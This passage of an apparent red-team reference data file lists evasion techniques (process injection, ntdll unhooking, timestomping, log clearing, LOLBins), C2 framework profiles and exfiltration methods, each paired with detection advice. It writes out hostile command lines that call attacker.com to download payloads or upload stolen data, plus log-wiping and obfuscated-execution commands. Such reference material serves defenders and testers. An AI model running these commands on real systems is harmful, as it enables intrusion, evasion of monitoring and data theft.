      'Monitor for processes created in a suspended state followed by memory modifications',
      'Alert on NtUnmapViewOfSection calls on remote processes',
      'Compare the in-memory image of a process against its on-disk binary',
      'Detect mismatches between the process image path and actual loaded code',
      'Use memory forensics tools (Volatility, WinDbg) to identify hollowed processes'
    ]
  },
  {
    name: 'DLL Injection',
    mitreTechnique: 'T1055.001',
    description: 'DLL injection forces a target process to load an attacker-controlled DLL into its address space. The classic technique uses CreateRemoteThread to call LoadLibrary in the target process with the path to the malicious DLL as an argument. Once loaded, the DLL code runs within the context and security permissions of the host process.',
    codeSnippets: [
      '# Classic DLL injection steps:',
      '# 1. OpenProcess with PROCESS_ALL_ACCESS on target PID',
      '# 2. VirtualAllocEx to allocate memory for the DLL path string',
      '# 3. WriteProcessMemory to write the DLL path into the allocated memory',
      '# 4. GetProcAddress to resolve LoadLibraryA address in kernel32.dll',
      '# 5. CreateRemoteThread targeting LoadLibraryA with the DLL path as argument',
      '# Alternatively use NtCreateThreadEx, QueueUserAPC, or SetWindowsHookEx'
    ],
    detectionMethods: [
      'Monitor for CreateRemoteThread calls targeting processes owned by other users',
      'Alert on DLL loads from unusual file paths (temp directories, user writable locations)',
      'Track VirtualAllocEx and WriteProcessMemory calls to remote processes',
      'Use Sysmon Event ID 8 (CreateRemoteThread) for detection',
      'Monitor for unsigned DLLs loaded into signed processes'
    ]
  },
  {
    name: 'Shellcode Injection',
    mitreTechnique: 'T1055.005',
    description: 'Shellcode injection writes position-independent code directly into a target process memory space and creates a thread to execute it. Unlike DLL injection, this technique does not require a file on disk, making it more stealthy. The injected shellcode typically bootstraps a more capable implant or beacon by loading necessary APIs at runtime through PEB walking.',
    codeSnippets: [
      '# Thread execution hijacking variant:',
      '# 1. OpenProcess and OpenThread on target process',
      '# 2. SuspendThread to pause the target thread',
      '# 3. VirtualAllocEx with PAGE_EXECUTE_READWRITE in target process',
      '# 4. WriteProcessMemory to copy shellcode into allocated memory',
      '# 5. GetThreadContext and modify RIP/EIP to point to shellcode',
      '# 6. SetThreadContext and ResumeThread'
    ],
    detectionMethods: [
      'Monitor for VirtualAllocEx with executable permissions in remote processes',
      'Alert on WriteProcessMemory followed by thread creation or context modification',
      'Detect RWX memory regions in processes that should not have them',
      'Use memory scanning to identify known shellcode patterns',
      'Monitor for NtCreateThreadEx, RtlCreateUserThread calls targeting remote processes'
    ]
  },
  {
    name: 'Reflective DLL Loading',
    mitreTechnique: 'T1620',
    description: 'Reflective DLL loading maps a DLL into memory manually without using the Windows loader (LoadLibrary). The DLL contains a reflective loader function that handles its own mapping, including parsing PE headers, resolving imports, and executing TLS callbacks. Since LoadLibrary is never called, the DLL does not appear in the process module list and the load is not logged by standard DLL load monitoring.',
    codeSnippets: [
      '# The reflective loader within the DLL performs:',
      '# 1. Calculate its own base address in memory',
      '# 2. Parse PE headers to determine section layout',
      '# 3. Map each section to the correct relative virtual address',
      '# 4. Process the relocation table to fix absolute addresses',
      '# 5. Resolve imports by walking the PEB to find loaded modules',
      '# 6. Execute TLS callbacks and call DllMain',
      '# Used by Metasploit meterpreter, Cobalt Strike Beacon, and many implant frameworks'
    ],
    detectionMethods: [
      'Scan for RWX memory regions that contain PE headers (MZ/PE signatures)',
      'Use memory forensics to detect unbacked executable memory regions',
      'Monitor for manual resolution of API addresses through PEB walking',
      'Detect patterns of VirtualAlloc followed by section-aligned memory writes',
      'ETW can capture image load events even for reflectively loaded modules in some cases'
    ]
  },
  {
    name: 'Direct Syscalls',
    mitreTechnique: 'T1106',
    description: 'Security products hook user-mode API functions in ntdll.dll to intercept suspicious calls. Direct syscall techniques bypass these hooks by invoking the kernel system call interface directly, skipping the hooked ntdll.dll functions entirely. Tools like SysWhispers generate syscall stubs that resolve syscall numbers dynamically, allowing attackers to call Nt* functions without touching ntdll.',
    codeSnippets: [
      '# SysWhispers approach: generate assembly stubs for direct syscalls',
      '# The stub sets up the syscall number in EAX and executes the syscall instruction',
      '# Syscall numbers vary by Windows version and must be resolved dynamically',
      '# Tools: SysWhispers, SysWhispers2, SysWhispers3, Hell\'s Gate, Halo\'s Gate',
      '# Example flow: resolve syscall number from ntdll, build stub, invoke syscall directly'
    ],
    detectionMethods: [
      'Monitor for syscall instructions executed from memory regions outside ntdll.dll',
      'Use kernel-mode callbacks (PsSetCreateProcessNotifyRoutine) instead of user-mode hooks',
      'Detect the absence of expected ntdll.dll in the call stack for system calls',
      'Intel Processor Trace can detect syscall instruction execution outside ntdll',
      'ETW kernel providers capture some syscall activity regardless of user-mode bypasses'
    ]
  },
  {
    name: 'Unhooking ntdll.dll',
    mitreTechnique: 'T1562.001',
    description: 'EDR and antivirus products inject hooks into ntdll.dll in each process to monitor API calls. Attackers can remove these hooks by reading a fresh copy of ntdll.dll from disk and overwriting the hooked .text section in memory with the original unhooked version. This restores the original function prologues, effectively removing all user-mode hooks placed by security products.',
    codeSnippets: [
      '# Full ntdll unhooking process:',
      '# 1. Read a clean copy of ntdll.dll from C:\\Windows\\System32\\ntdll.dll or from KnownDlls',
      '# 2. Map the clean copy into memory',
      '# 3. Find the .text section in both the hooked and clean copies',
      '# 4. Use VirtualProtect to make the hooked .text section writable',
      '# 5. Copy the clean .text section over the hooked version',
      '# 6. Restore original memory protections with VirtualProtect'
    ],
    detectionMethods: [
      'Monitor for file reads of ntdll.dll from disk (suspicious outside of process startup)',
      'Detect VirtualProtect calls changing ntdll.dll .text section permissions',
      'Use kernel-mode hooks or callbacks that cannot be removed from user mode',
      'Monitor for LdrLoadDll or NtMapViewOfSection calls targeting ntdll.dll',
      'Periodically verify the integrity of hooks in ntdll.dll from a kernel driver'
    ]
  },
  {
    name: 'Timestomping',
    mitreTechnique: 'T1070.006',
    description: 'Timestomping modifies file creation, modification, access, and MFT entry timestamps to match legitimate system files, making malicious files blend in with the operating system. Attackers modify both the $STANDARD_INFORMATION and $FILE_NAME attributes in NTFS to provide consistent timestamps. This makes chronological file analysis and timeline forensics significantly more difficult.',
    codeSnippets: [
      'timestomp.exe payload.exe -m "01/01/2022 12:00:00"',
      'PowerShell: (Get-Item payload.exe).LastWriteTime = "01/15/2022 08:30:00"',
      'PowerShell: (Get-Item payload.exe).CreationTime = "01/15/2022 08:30:00"',
      'touch -t 202201150830 /tmp/payload (Linux)',
      'Metasploit Meterpreter: timestomp payload.exe -b (blank MACE values)'
    ],
    detectionMethods: [
      'Compare $STANDARD_INFORMATION timestamps against $FILE_NAME timestamps in the MFT',
      'Look for files with timestamps that predate the volume creation date',
      'Identify timestamps that exactly match common system files (suspiciously precise)',
      'Use USN Journal to track actual file modification events independent of timestamps',
      'MFT analysis tools (MFTECmd, analyzeMFT) can detect timestamp inconsistencies'
    ]
  },
  {
    name: 'Indicator Removal - Log Clearing',
    mitreTechnique: 'T1070.001',
    description: 'Attackers clear Windows Event Logs, Linux syslog files, and application logs to remove evidence of their activities. On Windows, the wevtutil command or Event Viewer can clear individual log channels. On Linux, truncating or deleting log files removes forensic evidence. However, log clearing itself generates detectable events (Event ID 1102 for Security log clearing on Windows).',
    codeSnippets: [
      'wevtutil cl Security',
      'wevtutil cl System',
      'wevtutil cl Application',
      'Clear-EventLog -LogName Security,System,Application',
      'echo "" > /var/log/auth.log (Linux)',
      'truncate -s 0 /var/log/syslog',
      'journalctl --vacuum-time=1s (clear systemd journal)'
    ],
    detectionMethods: [
      'Event ID 1102 is generated when the Security event log is cleared',
      'Event ID 104 is generated when any event log is cleared via wevtutil',
      'Forward logs to a centralized SIEM in real time so clearing local logs does not remove evidence',
      'Monitor for wevtutil.exe or Clear-EventLog execution',
      'Use immutable log storage to prevent tampering'
    ]
  },
  {
    name: 'Obfuscation - Encoded Commands',
    mitreTechnique: 'T1027',
    description: 'Attackers encode, encrypt, or obfuscate commands and scripts to evade signature-based detection. Common techniques include Base64 encoding of PowerShell commands, string concatenation, variable substitution, and character code conversion. Multiple layers of encoding can be stacked to make static analysis extremely difficult while maintaining the same runtime behavior.',
    codeSnippets: [
      'powershell -EncodedCommand <base64_string>',
      'cmd /c "p^ow^er^sh^ell" (caret insertion)',
      '$a="Invoke";$b="-Expression";iex "$a$b (Get-Content script.ps1)"',
      'certutil -decode encoded.b64 payload.exe (certutil for decode)',
      'echo payload_base64 | base64 -d | bash (Linux pipe decoding)'
    ],
    detectionMethods: [
      'Enable PowerShell script block logging (Event ID 4104) which logs deobfuscated content',
      'Monitor for -EncodedCommand or -enc parameter usage with PowerShell',
      'Use deobfuscation tools (PSDecode, Revoke-Obfuscation) for analysis',
      'Alert on certutil.exe being used with -decode or -urlcache flags',
      'Implement behavioral detection that focuses on actions rather than command strings'
    ]
  },
  {
    name: 'Living-off-the-Land Binaries (LOLBins)',
    mitreTechnique: 'T1218',
    description: 'LOLBins are legitimate signed Windows binaries that can be abused to download, execute, or proxy execution of malicious payloads. Because these binaries are signed by Microsoft and present on default Windows installations, their execution is often trusted by application whitelisting and endpoint protection solutions. The LOLBAS project documents hundreds of such binaries and their abuse potential.',
    codeSnippets: [
      'mshta http://attacker.com/payload.hta',
      'certutil -urlcache -split -f http://attacker.com/payload.exe C:\\Windows\\Temp\\payload.exe',
      'rundll32 javascript:"\\..\\mshtml,RunHTMLApplication";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd")',
      'regsvr32 /s /n /u /i:http://attacker.com/sct scrobj.dll',
      'msiexec /q /i http://attacker.com/payload.msi',
      'wmic process call create "payload.exe"',
      'forfiles /p C:\\Windows /m notepad.exe /c "cmd /c payload.exe"',
      'pcalua -a payload.exe'
    ],
    detectionMethods: [
      'Monitor LOLBin processes for unusual command-line arguments',
      'Alert on LOLBins making network connections (certutil, mshta, msiexec downloading)',
      'Track LOLBin execution with child process analysis',
      'Reference the LOLBAS project for known abuse patterns: lolbas-project.github.io',
      'Implement application control policies that restrict LOLBin abuse scenarios'
    ]
  },
  {
    name: 'Signed Binary Proxy Execution - Rundll32',
    mitreTechnique: 'T1218.011',
    description: 'Rundll32.exe is a signed Windows binary used to execute DLL exported functions. Attackers abuse rundll32 to load and execute malicious DLLs, bypassing application whitelisting and blending with legitimate system activity. Rundll32 can also execute JavaScript, COM scriptlets, and other content types through various documented abuse paths.',
    codeSnippets: [
      'rundll32.exe malicious.dll,EntryPoint',
      'rundll32.exe shell32.dll,ShellExec_RunDLL "cmd.exe" "/c payload"',
      'rundll32.exe advpack.dll,LaunchINFSection payload.inf,DefaultInstall_SingleUser,1,',
      'rundll32.exe url.dll,FileProtocolHandler http://attacker.com/payload.exe'
    ],
    detectionMethods: [
      'Monitor rundll32.exe command-line arguments for unusual DLL paths',
      'Alert on rundll32 loading DLLs from temp directories or user-writable locations',
      'Track rundll32 network connections (normally should not make outbound connections)',
      'Detect rundll32 spawning child processes like cmd.exe or powershell.exe',
      'Use Sysmon Event ID 1 (Process Create) to capture full command lines'
    ]
  },
  {
    name: 'Masquerading - Rename System Utilities',
    mitreTechnique: 'T1036.003',
    description: 'Attackers rename their tools and payloads to match legitimate system binary names to evade casual inspection and simple filename-based detection rules. A malicious executable named svchost.exe or explorer.exe running from an unusual directory may escape notice during manual investigation. Advanced masquerading includes matching the file metadata, version information, and digital signature appearance.',
    codeSnippets: [
      'rename payload.exe svchost.exe',
      'copy payload.exe C:\\Windows\\Temp\\csrss.exe',
      'Using resource editors to copy version information from legitimate binaries',
      'Matching the PE metadata (CompanyName, FileDescription) of the impersonated binary'
    ],
    detectionMethods: [
      'Verify that system binaries are running from their expected directories (System32, SysWOW64)',
      'Compare file hashes of binaries against known-good baselines',
      'Alert on known system binary names executing from non-standard paths',
      'Use digital signature verification to detect unsigned copies of normally signed binaries',
      'Sysmon Event ID 1 captures both process name and full path for comparison'
    ]
  },
  {
    name: 'Process Doppelganging',
    mitreTechnique: 'T1055.013',
    description: 'Process doppelganging abuses the Windows NTFS transaction mechanism to create a fileless process from a legitimate executable. The technique creates an NTFS transaction, overwrites a legitimate file within the transaction with malicious code, creates a section from the transacted file, then rolls back the transaction. The on-disk file reverts to its original state while the malicious code executes in memory from the created section.',
    codeSnippets: [
      '# Process Doppelganging steps:',
      '# 1. NtCreateTransaction - create a new NTFS transaction',
      '# 2. Open a legitimate file within the transaction context',
      '# 3. Overwrite the file content with malicious PE within the transaction',
      '# 4. NtCreateSection - create a section from the transacted (malicious) file',
      '# 5. NtRollbackTransaction - revert the file to its original state on disk',
      '# 6. NtCreateProcessEx - create a process from the section containing malicious code'
    ],
    detectionMethods: [
      'Monitor for NtCreateTransaction API calls from non-standard applications',
      'Detect the sequence of TxF operations followed by process creation',
      'Use kernel-mode process creation callbacks to inspect the backing section',
      'Memory forensics can detect processes whose backing file does not match the on-disk version',
      'Modern EDR solutions detect the characteristic API call sequence'
    ]
  }
];

const C2_FRAMEWORKS = [
  {
    name: 'Cobalt Strike',
    language: 'Java (Team Server), C (Beacon)',
    license: 'Commercial (per-operator license)',
    description: 'Cobalt Strike is the most widely used commercial adversary simulation platform. It provides a full-featured Beacon implant with extensive post-exploitation capabilities, Malleable C2 profiles for traffic customization, and a collaborative team server architecture. While designed for legitimate red team operations, it has been heavily adopted by threat actors.',
    features: [
      'Malleable C2 profiles for traffic shaping',
      'Beacon payload with staged and stageless options',
      'Built-in privilege escalation and lateral movement',
      'SOCKS proxy and port forwarding',
      'Aggressor Script for automation',
      'Browser pivoting and user exploitation',
      'Memory-only payload execution',
      'Artifact Kit for payload customization',
      'BOF (Beacon Object Files) for in-memory execution'
    ],
    protocols: ['HTTP', 'HTTPS', 'DNS', 'SMB (named pipes)', 'TCP', 'Raw TCP'],
    pros: 'Mature platform with extensive documentation, large community, and deep integration capabilities. Malleable C2 profiles provide unmatched traffic customization. BOF support enables extensibility without touching disk.',
    cons: 'Expensive commercial license. Widely detected by security products due to prevalence. Cracked versions are commonly used by threat actors, leading to extensive signature development by defenders. Default configurations are well-known to SOC analysts.',
    detectionSignatures: [
      'Default named pipe: MSSE-[0-9]+-server',
      'Default Beacon watermark in metadata',
      'Sleep mask deobfuscation patterns in memory',
      'Malleable C2 default profile HTTP headers and URIs',
      'JARM hash for default HTTPS listeners',
      'Characteristic Beacon shellcode loader patterns'
    ]
  },
  {
    name: 'Sliver',
    language: 'Go',
    license: 'Open Source (GPLv3)',
    description: 'Sliver is an open-source, cross-platform adversary emulation framework developed by BishopFox. It generates implants in Go that compile to native binaries for Windows, Linux, and macOS without runtime dependencies. Sliver supports multiplayer mode for team operations and offers extensive operator extensibility through its gRPC API.',
    features: [
      'Cross-platform implants (Windows, Linux, macOS)',
      'Multiplayer mode with operator management',
      'Procedural C2 over mTLS, WireGuard, HTTP(S), DNS',
      'Automatic certificate management for HTTPS',
      'Built-in pivoting and port forwarding',
      'BOF and COFF loader support',
      'Armory for extension management',
      'Process injection and migration',
      'Stager support with shellcode generation'
    ],
    protocols: ['mTLS', 'WireGuard', 'HTTP', 'HTTPS', 'DNS', 'TCP', 'Named Pipes'],
    pros: 'Free and open source with active development. Cross-platform implant support. Unique per-binary implant generation makes signature-based detection harder. WireGuard protocol support provides encrypted tunneling.',
    cons: 'Growing detection signatures as adoption increases. Go binary size is relatively large. Less mature ecosystem compared to Cobalt Strike. Documentation can lag behind feature development.',
    detectionSignatures: [
      'Go binary compilation artifacts',
      'Default mTLS certificate patterns',
      'Sliver implant configuration structure in memory',
      'Known Sliver HTTP(S) URI patterns in default profiles',
      'WireGuard protocol on non-standard ports'
    ]
  },
  {
    name: 'Havoc',
    language: 'C/C++ (Demon agent), Python/Qt (Teamserver/Client)',
    license: 'Open Source',
    description: 'Havoc is a modern, open-source command-and-control framework featuring a Demon agent written in C. It provides a collaborative team server with a Qt-based GUI client and supports extensive post-exploitation capabilities. Havoc emphasizes evasion through features like indirect syscalls, return address spoofing, and sleep obfuscation.',
    features: [
      'Demon agent with indirect syscalls',
      'Sleep obfuscation (Ekko, Zilean)',
      'Return address stack spoofing',
      'Token vault for credential management',
      'BOF and .NET assembly execution',
      'SOCKS5 proxy support',
      'Extensible through Python and C plugins',
      'Payload generation with multiple formats'
    ],
    protocols: ['HTTP', 'HTTPS', 'SMB'],
    pros: 'Free and open source. Modern evasion techniques built-in (indirect syscalls, sleep obfuscation). Active community development. Qt GUI provides a user-friendly interface for operators.',
    cons: 'Primarily Windows-focused for the Demon agent. Less mature than Cobalt Strike or Sliver. Growing detection coverage as security vendors analyze it. Limited protocol diversity compared to other frameworks.',
    detectionSignatures: [
      'Demon agent sleep obfuscation memory patterns',
      'Havoc shellcode loader characteristics',
      'Default HTTP listener response patterns',
      'Demon agent configuration in memory'
    ]
  },
  {
    name: 'Mythic',
    language: 'Go (server), Various (agents)',
    license: 'Open Source (BSD-3-Clause)',
    description: 'Mythic is a collaborative, multi-platform red team framework that uses a microservices architecture with Docker containers. It supports multiple agent types written in different languages (Python, C#, Swift, Go) and allows operators to mix and match agents and C2 profiles. The web-based UI provides real-time collaboration and extensive logging.',
    features: [
      'Multi-agent architecture (Apollo, Poseidon, Medusa, Athena)',
      'Web-based collaborative UI',
      'Docker containerized microservices',
      'Dynamic C2 profile loading',
      'Artifact tracking and logging',
      'SOCKS proxy and port forwarding',
      'File browser and process browser',
      'Extensive API for automation',
      'Cross-platform agent support'
    ],
    protocols: ['HTTP', 'HTTPS', 'TCP', 'WebSocket', 'SMB', 'DNS'],
    pros: 'Modular architecture supports multiple agent types. Excellent logging and tracking for operations documentation. Web-based UI accessible from any browser. Active community with multiple maintained agents.',
    cons: 'Docker dependency adds complexity to deployment. Multiple agents can lead to confusion about which to use. Resource-intensive due to microservices architecture. Agent quality varies across the ecosystem.',
    detectionSignatures: [
      'Agent-specific indicators vary by payload type',
      'Default HTTP response patterns per C2 profile',
      'Apollo agent .NET assembly loading patterns',
      'Poseidon agent Go binary characteristics'
    ]
  },
  {
    name: 'Merlin',
    language: 'Go',
    license: 'Open Source (GPLv3)',
    description: 'Merlin is a cross-platform post-exploitation C2 server and agent written in Go. It supports HTTP/2 and HTTP/3 (QUIC) protocols, which are less commonly monitored by security tools compared to HTTP/1.1. Merlin compiles agents as native binaries for Windows, Linux, and macOS with no runtime dependencies required on the target system.',
    features: [
      'HTTP/2 and HTTP/3 (QUIC) protocol support',
      'Cross-platform agents (Windows, Linux, macOS)',
      'OPAQUE password authenticated key exchange',
      'Encrypted JWT for agent communication',
      'Module-based post-exploitation',
      'DLL and shellcode agent formats',
      'Configurable agent sleep and jitter'
    ],
    protocols: ['HTTP/2', 'HTTP/3 (QUIC)', 'HTTP', 'HTTPS'],
    pros: 'HTTP/2 and HTTP/3 support provides protocol-level evasion. Written in Go for cross-platform support. OPAQUE key exchange provides strong authentication. Native binaries with no dependencies.',
    cons: 'Smaller community compared to Cobalt Strike or Sliver. Less extensive post-exploitation module library. HTTP/2 and HTTP/3 can be distinctive on networks that primarily use HTTP/1.1. Limited documentation.',
    detectionSignatures: [
      'QUIC protocol on unexpected ports',
      'HTTP/2 traffic from non-browser user agents',
      'Merlin JWT token structure in HTTP headers',
      'Go binary compilation artifacts'
    ]
  },
  {
    name: 'PoshC2',
    language: 'Python (server), PowerShell/C# (implants)',
    license: 'Open Source (BSD-3-Clause)',
    description: 'PoshC2 is a proxy-aware C2 framework that generates PowerShell, C#, and Python implants. Originally focused on PowerShell, it has evolved to include compiled C# implants for environments where PowerShell is heavily monitored. PoshC2 supports daisy-chaining for pivoting through multiple compromised hosts.',
    features: [
      'PowerShell, C#, and Python implants',
      'Proxy-aware communications',
      'Daisy-chaining for network pivoting',
      'Sharp modules for post-exploitation',
      'Domain fronting support',
      'Automated reporting',
      'URL randomization',
      'Built-in lateral movement modules'
    ],
    protocols: ['HTTP', 'HTTPS'],
    pros: 'Multiple implant types for different scenarios. Good operational logging and reporting features. Proxy-aware for corporate network environments. Daisy-chaining enables complex pivoting scenarios.',
    cons: 'PowerShell implants are heavily detected. Limited protocol options compared to other frameworks. Smaller development team and community. C# implants are less mature than PowerShell variants.',
    detectionSignatures: [
      'PowerShell implant encoded command patterns',
      'Default PoshC2 HTTP URI structure',
      'C# implant .NET assembly load patterns',
      'Known PoshC2 user agent strings'
    ]
  },
  {
    name: 'Covenant',
    language: 'C# (.NET)',
    license: 'Open Source (GPLv3)',
    description: 'Covenant is a .NET-based C2 framework with a web-based interface. It features Grunt implants written in C# that support various communication profiles. Covenant emphasizes usability with its collaborative web UI and provides built-in task libraries for common red team operations. Development has slowed but it remains useful for .NET-focused engagements.',
    features: [
      'Web-based collaborative UI',
      'C# Grunt implants',
      'Bridge listeners for pivoting',
      'Built-in task library',
      'Dynamic compilation of tasks',
      'Configurable communication profiles',
      'Multi-user collaboration',
      'Graph-based operation visualization'
    ],
    protocols: ['HTTP', 'HTTPS', 'SMB'],
    pros: 'Excellent web-based interface for team operations. Good for .NET-focused environments. Built-in task library covers common post-exploitation needs. Bridge listeners enable flexible pivoting.',
    cons: 'Development has slowed significantly. .NET dependency may not be available on all targets. Growing detection signatures. Limited cross-platform support (Windows-focused).',
    detectionSignatures: [
      'Grunt implant .NET assembly patterns',
      'Default Covenant HTTP profile URIs',
      'Grunt communication beacon patterns',
      '.NET dynamic compilation artifacts'
    ]
  },
  {
    name: 'Brute Ratel C4',
    language: 'C/C++',
    license: 'Commercial (per-operator license)',
    description: 'Brute Ratel C4 (BRC4) is a commercial adversary simulation framework designed specifically to evade modern EDR solutions. It features a Badger implant that uses direct syscalls, API hashing, and multiple sleep obfuscation techniques. BRC4 gained notoriety when cracked versions were adopted by threat actors and used in real-world attacks.',
    features: [
      'Badger implant with direct syscall support',
      'Multiple sleep obfuscation techniques',
      'API hashing for import resolution',
      'LDAP sentinel for Active Directory queries',
      'Custom C2 channel over DNS, HTTP, SMB, TCP',
      'Built-in lateral movement and privilege escalation',
      'Payload encryption and obfuscation',
      'Profile-based traffic customization'
    ],
    protocols: ['HTTP', 'HTTPS', 'DNS', 'SMB', 'TCP', 'DOH (DNS over HTTPS)'],
    pros: 'Purpose-built for EDR evasion with direct syscalls and sleep obfuscation. DNS over HTTPS support for stealthy C2. Active development focused on evasion improvements. Lightweight Badger implant.',
    cons: 'Expensive commercial license. Cracked versions used by APT groups have led to increased detection development. Smaller community than Cobalt Strike. Controversy around license enforcement.',
    detectionSignatures: [
      'Badger implant memory patterns during sleep obfuscation',
      'BRC4 shellcode loader characteristics',
      'DOH request patterns to known resolvers',
      'Badger configuration structure in memory'
    ]
  },
  {
    name: 'Metasploit Framework',
    language: 'Ruby',
    license: 'Open Source (BSD)',
    description: 'Metasploit Framework is the most widely used open-source penetration testing platform. It provides a comprehensive library of exploits, payloads, and post-exploitation modules. While its Meterpreter implant is heavily detected by security products, Metasploit remains valuable for exploit development, vulnerability validation, and as a payload generation tool for other frameworks.',
    features: [
      'Extensive exploit library (2000+ modules)',
      'Meterpreter agent for multiple platforms',
      'Payload generation with msfvenom',
      'Post-exploitation module library',
      'Auxiliary scanning and enumeration modules',
      'Database integration for engagement tracking',
      'Resource scripts for automation',
      'Web interface (Metasploit Pro)',
      'Active community and rapid exploit development'
    ],
    protocols: ['HTTP', 'HTTPS', 'TCP', 'Named Pipes'],
    pros: 'Largest exploit and module library available. Excellent for exploit development and validation. msfvenom is the standard for payload generation. Massive community and extensive documentation.',
    cons: 'Meterpreter is heavily signatured and detected by most AV/EDR. Not designed for stealth in modern defended environments. Ruby performance limitations for large engagements. Default configurations are immediately flagged.',
    detectionSignatures: [
      'Meterpreter default named pipe patterns',
      'msfvenom shellcode template signatures',
      'Default Metasploit HTTP stager URIs (checksum8 patterns)',
      'Meterpreter TLV protocol patterns',
      'Known Metasploit module exploitation artifacts'
    ]
  },
  {
    name: 'Empire / Starkiller',
    language: 'Python (server), PowerShell/C#/Python (agents)',
    license: 'Open Source (BSD-3-Clause)',
    description: 'Empire is a post-exploitation framework featuring PowerShell, C#, and Python agents. The Starkiller frontend provides a modern web UI for interacting with the Empire server. Empire includes an extensive module library for credential harvesting, lateral movement, persistence, and situational awareness. BC Security maintains the actively developed fork.',
    features: [
      'PowerShell, C#, and Python agents',
      'Starkiller web-based GUI',
      'Extensive module library (400+ modules)',
      'Malleable C2 communication profiles',
      'Plugin architecture for extensibility',
      'Built-in credential harvesting',
      'Automated lateral movement workflows',
      'SOCKS proxy support',
      'Integrated Mimikatz functionality'
    ],
    protocols: ['HTTP', 'HTTPS'],
    pros: 'Large module library covering extensive post-exploitation scenarios. Active maintenance by BC Security. Starkiller provides modern web interface. Good documentation and community support.',
    cons: 'PowerShell agents are heavily detected. Limited protocol options for C2. Resource-intensive server component. Some modules are outdated or unreliable.',
    detectionSignatures: [
      'Empire PowerShell agent staging patterns',
      'Default Empire HTTP listener response headers',
      'Known Empire module artifacts (Invoke-Mimikatz, etc.)',
      'C# agent (Sharpire) compilation patterns'
    ]
  }
];

const EXFILTRATION_METHODS = [
  {
    name: 'Exfiltration Over HTTPS',
    mitreTechnique: 'T1048.002',
    description: 'Data exfiltration over HTTPS blends with normal encrypted web traffic, making detection extremely difficult without TLS inspection. Attackers upload data to cloud storage services, paste sites, or custom HTTPS endpoints. This method benefits from the ubiquity of HTTPS traffic in enterprise environments and the difficulty of distinguishing malicious uploads from legitimate ones.',
    tools: [
      'curl for direct HTTPS upload: curl -X POST -d @data.zip https://attacker.com/upload',
      'PowerShell: Invoke-WebRequest -Uri https://attacker.com/upload -Method POST -InFile data.zip',
      'Rclone for cloud storage sync: rclone copy /sensitive-data remote:exfil-bucket',
      'Custom HTTPS exfiltration scripts'
    ],
    detection: 'Deploy TLS inspection to analyze encrypted traffic content. Monitor for large outbound HTTPS transfers to uncommon destinations. Track unusual data volumes to cloud storage APIs. Alert on rclone.exe or similar cloud sync tool execution.',
    bandwidth: 'High - limited only by network bandwidth and TLS inspection evasion',
    stealthRating: 'High'
  },
  {
    name: 'DNS Tunneling',
    mitreTechnique: 'T1048.003',
    description: 'DNS tunneling encodes data within DNS queries and responses, using the DNS protocol as a covert communication channel. Data is encoded into subdomain labels of DNS queries, and responses are returned in TXT, CNAME, or other record types. DNS traffic is rarely blocked or inspected, making this a reliable exfiltration method even in highly restricted environments.',
    tools: [
      'dnscat2 for interactive DNS tunneling',
      'Iodine for IP-over-DNS tunneling: iodined -f 10.0.0.1 tunnel.attacker.com',
      'DNSExfiltrator for data exfiltration: dnsexfiltrator.py -d attacker.com -f secret.zip',
      'Cobalt Strike DNS Beacon'
    ],
    detection: 'Monitor for high volumes of DNS queries to a single domain. Alert on unusually long subdomain labels (data encoding). Detect DNS queries for TXT records at high frequency. Analyze DNS query entropy - encoded data has higher entropy than normal domain names. Implement DNS logging and baselining.',
    bandwidth: 'Low - typically 10-50 KB/s due to DNS packet size limits and query rate restrictions',
    stealthRating: 'High'
  },
  {
    name: 'ICMP Tunneling',
    mitreTechnique: 'T1095',
    description: 'ICMP tunneling embeds data within ICMP echo request and reply packets (ping). Since ICMP is a control protocol often allowed through firewalls, it can serve as a covert channel even when TCP and UDP ports are restricted. The data payload of ICMP packets is not inspected by most firewalls and network monitoring tools.',
    tools: [
      'ICMPTunnel: icmptunnel -s (server) / icmptunnel target_ip (client)',
      'Hans: hans -s 10.0.0.0 (server) / hans -c server_ip (client)',
      'PingTunnel: ptunnel -p proxy_host -lp 8000 -da target -dp 22',
      'Custom ICMP exfiltration scripts using raw sockets'
    ],
    detection: 'Monitor for ICMP packets with unusually large payloads. Alert on high-frequency ICMP traffic between specific hosts. Inspect ICMP data payload for non-standard content. Baseline normal ICMP patterns and alert on deviations.',
    bandwidth: 'Low - typically 5-20 KB/s limited by ICMP rate limiting and packet size',
    stealthRating: 'Medium'
  },
  {
    name: 'Exfiltration to Cloud Storage',
    mitreTechnique: 'T1567.002',
    description: 'Attackers upload stolen data to legitimate cloud storage services (AWS S3, Azure Blob, Google Drive, Dropbox, OneDrive, Mega) that are commonly used in enterprise environments. This traffic blends with legitimate business use of cloud services and is encrypted by default. Many organizations whitelist cloud storage domains, making this exfiltration path particularly effective.',
    tools: [
      'Rclone for multi-cloud sync: rclone copy /data remote:bucket',
      'AWS CLI: aws s3 cp data.zip s3://attacker-bucket/',
      'Azure CLI: az storage blob upload --file data.zip --container exfil',
      'Google Drive API with service account credentials',
      'Mega CMD: mega-put data.zip /exfil/'
    ],
    detection: 'Monitor for cloud sync tool execution (rclone, aws, az, gcloud). Track unusual volumes of uploads to cloud storage services. Implement CASB (Cloud Access Security Broker) for visibility. Alert on access to personal cloud storage accounts from corporate systems.',
    bandwidth: 'High - cloud storage services support high-speed uploads',
    stealthRating: 'High'
  },
  {
    name: 'Exfiltration Over Email',
    mitreTechnique: 'T1048.002',
    description: 'Attackers exfiltrate data by sending it as email attachments or embedded content to external email addresses. This can use the organizations own email infrastructure (Outlook, Exchange) or direct SMTP connections. Email-based exfiltration can bypass many network controls because email traffic is expected and often encrypted via TLS.',
    tools: [
      'PowerShell Send-MailMessage cmdlet',
      'SMTP client libraries for direct email sending',
      'Outlook COM object for sending via the user email client',
      'Exchange Web Services (EWS) API for programmatic email sending'
    ],
    detection: 'Monitor for emails with large attachments to external recipients. Implement DLP (Data Loss Prevention) rules on the email gateway. Alert on emails containing sensitive data patterns (SSN, credit card numbers). Track email sending volume per user for anomaly detection.',
    bandwidth: 'Medium - limited by email attachment size limits and sending rate restrictions',
    stealthRating: 'Medium'
  },
  {
    name: 'Exfiltration Over Removable Media',
    mitreTechnique: 'T1052.001',
    description: 'Physical exfiltration involves copying data to removable storage devices (USB drives, external hard drives, SD cards) and physically removing them from the target environment. This method completely bypasses network-based detection and is particularly relevant for air-gapped networks. The data can be encrypted on the removable device to avoid detection if the device is inspected.',
    tools: [
      'Xcopy, robocopy, or cp for file transfer to removable media',
      'USB Rubber Ducky for automated data collection and exfiltration',
      '7-Zip or GPG for encrypting data before transfer',
      'Custom scripts to identify and stage sensitive files'
    ],
